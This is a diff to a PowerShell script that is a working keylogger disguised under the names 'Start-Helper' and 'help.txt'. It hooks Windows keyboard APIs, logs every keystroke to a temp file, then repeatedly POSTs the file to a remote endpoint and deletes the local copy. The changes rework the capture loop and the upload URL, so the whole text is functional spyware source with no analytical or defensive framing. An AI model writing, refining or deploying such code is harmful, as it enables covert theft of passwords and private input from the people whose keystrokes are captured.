@@ -1,13 +1,9 @@
-$TimesToRun = 1                         # How many times to run the script.
-$RunTimeP = 1             		# Time in minutes.
-$endpoint = "192.168.66.2/server"       # Endpoint to send the file to.
-############################
+$TimesToRun = 20                      	# How many times to run the script.
+$RunTimeP = 0.1                        	# Runtime in minutes for each run.
+$endpoint = "http://192.168.66.2/server"  # Address to send the file to.
 
-$TimeStart = Get-Date
-$TimeEnd = $timeStart.addminutes($RunTimeP)
-
-#requires -Version 2
-function Start-Helper($Path="$env:temp\help.txt") 
+# Requires -Version 2
+function Start-Helper($Path = "$env:temp\help.txt") 
 {
   $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
@@ -22,46 +18,55 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
-  $null = New-Item -Path $Path -ItemType File -Force
+  try {
+    for ($Runner = 1; $Runner -le $TimesToRun; $Runner++) {
+      $TimeStart = Get-Date
+      $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
 
-  try
-  {
+      while ($TimeNow -le $TimeEnd) {
+        Start-Sleep -Milliseconds 40
+        $fileCreated = $false  # Flag to track if the file is created in this loop.
 
-    $Runner = 0
-        while ($TimesToRun  -ge $Runner) {
-        while ($TimeEnd -ge $TimeNow) {
-      Start-Sleep -Milliseconds 40
-      
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        $state = $API::GetAsyncKeyState($ascii)
+        for ($ascii = 9; $ascii -le 254; $ascii++) {
+          $state = $API::GetAsyncKeyState($ascii)
 
-        if ($state -eq -32767) {
-          $null = [console]::CapsLock
+          if ($state -eq -32767) {
+            $null = [console]::CapsLock
 
-          $virtualKey = $API::MapVirtualKey($ascii, 3)
+            $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-          $kbstate = New-Object Byte[] 256
-          $checkkbstate = $API::GetKeyboardState($kbstate)
+            $kbstate = New-Object Byte[] 256
+            $checkkbstate = $API::GetKeyboardState($kbstate)
 
-          $mychar = New-Object -TypeName System.Text.StringBuilder
+            $mychar = New-Object -TypeName System.Text.StringBuilder
 
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
-          if ($success) 
-          {
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::UTF8) 
+            if ($success) 
+            {
+              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::UTF8) 
+              $fileCreated = $true  # File is created.
+            }
           }
         }
+
+        $TimeNow = Get-Date
       }
-          $TimeNow = Get-Date
+
+      Invoke-WebRequest -Uri $endpoint -Method POST -ContentType 'text/plain' -InFile $Path
+      Remove-Item -Path $Path -Force
+
+      # Create an empty file if the script continues.
+      # As if there are no file, the POST request will fail and the script will finish.
+      if ($Runner -lt $TimesToRun) {
+        New-Item -Path $Path -ItemType File -Force
+      }
     }
-        Invoke-WebRequest -Uri http://$endpoint -Method POST -ContentType 'text/plain' -InFile $Path
-        Remove-Item -Path $Path -force
-        }
   }
   finally
   {
-        exit 1
+    exit 1
   }
 }
+
 Start-Helper
